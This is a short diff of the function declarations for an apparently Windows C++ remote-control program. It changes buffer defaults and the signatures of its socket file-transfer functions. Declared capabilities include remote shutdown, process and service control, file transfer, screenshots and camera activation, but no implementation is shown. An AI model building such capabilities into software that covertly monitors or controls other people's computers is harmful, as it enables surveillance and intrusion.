@@ -17,19 +17,12 @@
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "advapi32.lib")
 
-#ifndef DEFAULT_BUFLEN
-#define DEFAULT_BUFLEN 512
-#endif // !DEFAULT_BUFLEN
-
-
 struct Tasks {
 	wchar_t* TaskName = new wchar_t[512];
 	wchar_t* TaskDescribe = new wchar_t[512];
 };
 typedef struct Tasks TASK;
-TASK request2TASK(wchar_t*);
-int sendStr(SOCKET, const wchar_t*, int len = DEFAULT_BUFLEN);
-int recvStr(SOCKET, wchar_t*, int len = DEFAULT_BUFLEN);
+TASK request2TASK(char*);
 int doTasks(SOCKET, TASK);
 
 int ShutdownMachine();
@@ -40,8 +33,8 @@ int GetProcessList(wchar_t*);
 int listRunningServices(wchar_t*);
 int __stdcall DoStopSvc(LPCWSTR);
 int __stdcall DoStartSvc(LPCWSTR);
-int64_t RecvFile(SOCKET, const wchar_t*, int chunkSize = 64 * 1024);
-int64_t SendFile(SOCKET, const wchar_t*, int chunkSize = 64 * 1024);
+int64_t RecvFile(SOCKET, const std::string&, int);
+int64_t SendFile(SOCKET, const std::string& , int);
 int WINAPI SaveBitmap(WCHAR*);
 int WINAPI turnOnCamera(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow);
 
